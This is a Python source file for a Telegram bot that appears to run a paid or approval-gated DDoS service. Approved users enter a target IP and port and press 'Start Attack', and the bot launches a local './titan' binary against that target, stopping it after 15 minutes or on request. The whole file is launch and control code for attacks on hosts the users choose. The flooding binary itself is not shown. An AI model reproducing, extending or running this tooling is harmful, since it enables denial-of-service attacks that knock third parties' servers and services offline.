# bot.py

import time
import requests
import logging
import json
import os
import telebot
from threading import Thread, Timer
import subprocess
from datetime import datetime, timedelta

# Load configuration from config.json
with open('config.json') as config_file:
    config = json.load(config_file)

BOT_TOKEN = config['bot_token']
ADMIN_IDS = config['admin_ids']

bot = telebot.TeleBot(BOT_TOKEN, threaded=False)

# File paths
USERS_FILE = 'users.txt'
USER_ATTACK_FILE = 'user_attack_details.json'

# Blocked ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Load users from file
def load_users():
    if not os.path.exists(USERS_FILE):
        return []
    with open(USERS_FILE, 'r') as f:
        return [json.loads(line.strip()) for line in f if line.strip()]

# Save users to file
def save_users(users):
    with open(USERS_FILE, 'w') as f:
        for user in users:
            f.write(json.dumps(user) + '\n')

users = load_users()

# Load attack data
def load_user_attack_data():
    if os.path.exists(USER_ATTACK_FILE):
        with open(USER_ATTACK_FILE, 'r') as f:
            try:
                return json.load(f)
            except json.JSONDecodeError:
                logging.error("Invalid JSON format in user attack file.")
    return {}

def save_user_attack_data(data):
    with open(USER_ATTACK_FILE, 'w') as f:
        json.dump(data, f)

user_attack_details = load_user_attack_data()
active_attacks = {}
attack_timers = {}

# Check if user is admin
def is_user_admin(user_id):
    return user_id in ADMIN_IDS

# Check if user is approved
def check_user_approval(user_id):
    return any(user['user_id'] == user_id and user['plan'] > 0 for user in users)

# Send not approved message
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED TO USE THIS ⚠*", parse_mode='Markdown')

# Run attack command
def run_attack_command_sync(target_ip, target_port, action):
    if action == 1:
        process = subprocess.Popen(["./titan", target_ip, str(target_port), "1"])
        active_attacks[(target_ip, target_port)] = process
    elif action == 2:
        process = active_attacks.pop((target_ip, target_port), None)
        if process:
            process.terminate()

# Auto-stop attack
def auto_stop_attack(user_id, target_ip, target_port, chat_id):
    if (target_ip, target_port) in active_attacks:
        bot.send_message(chat_id, f"Attack on {target_ip}:{target_port} stopped after 15 minutes.", parse_mode='Markdown')
        run_attack_command_sync(target_ip, target_port, 2)

# Keyboard setup
btn_attack = telebot.types.KeyboardButton("Save Attack ⚡")
btn_start = telebot.types.KeyboardButton("Start Attack 🚀")
btn_stop = telebot.types.KeyboardButton("Stop Attack 🔴")

markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
markup.add(btn_attack, btn_start, btn_stop)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if not check_user_approval(user_id):
        send_not_approved_message(message.chat.id)
        return
    bot.send_message(message.chat.id, "Welcome! Choose an option.", reply_markup=markup)

@bot.message_handler(func=lambda msg: msg.text == 'Save Attack ⚡')
def handle_attack_setup(message):
    msg = bot.send_message(message.chat.id, "Enter target IP and port: `IP PORT`")
    bot.register_next_step_handler(msg, save_ip_port)

def save_ip_port(message):
    try:
        ip, port = message.text.split()
        user_attack_details[message.from_user.id] = [ip, port]
        save_user_attack_data(user_attack_details)
        bot.send_message(message.chat.id, f"Saved: {ip}:{port}", parse_mode='Markdown')
    except ValueError:
        bot.send_message(message.chat.id, "Invalid format. Use: `IP PORT`")

@bot.message_handler(func=lambda msg: msg.text == 'Start Attack 🚀')
def handle_start_attack(message):
    user_id = message.from_user.id
    if not check_user_approval(user_id):
        send_not_approved_message(message.chat.id)
        return

    attack_details = user_attack_details.get(user_id)
    if attack_details:
        ip, port = attack_details
        if int(port) in blocked_ports:
            bot.send_message(message.chat.id, f"Port {port} is blocked.", parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, f"Starting attack on {ip}:{port}", parse_mode='Markdown')
            Thread(target=run_attack_command_sync, args=(ip, port, 1)).start()
            attack_timers[user_id] = Timer(900, auto_stop_attack, args=[user_id, ip, port, message.chat.id])
            attack_timers[user_id].start()

@bot.message_handler(func=lambda msg: msg.text == 'Stop Attack 🔴')
def handle_stop_attack(message):
    user_id = message.from_user.id
    attack_details = user_attack_details.get(user_id)
    if attack_details:
        ip, port = attack_details
        bot.send_message(message.chat.id, f"Stopping attack on {ip}:{port}", parse_mode='Markdown')
        run_attack_command_sync(ip, port, 2)
        attack_timers.get(user_id, Timer(0, lambda: None)).cancel()

def run_bot():
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Polling error: {e}")
            time.sleep(15)

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    run_bot()
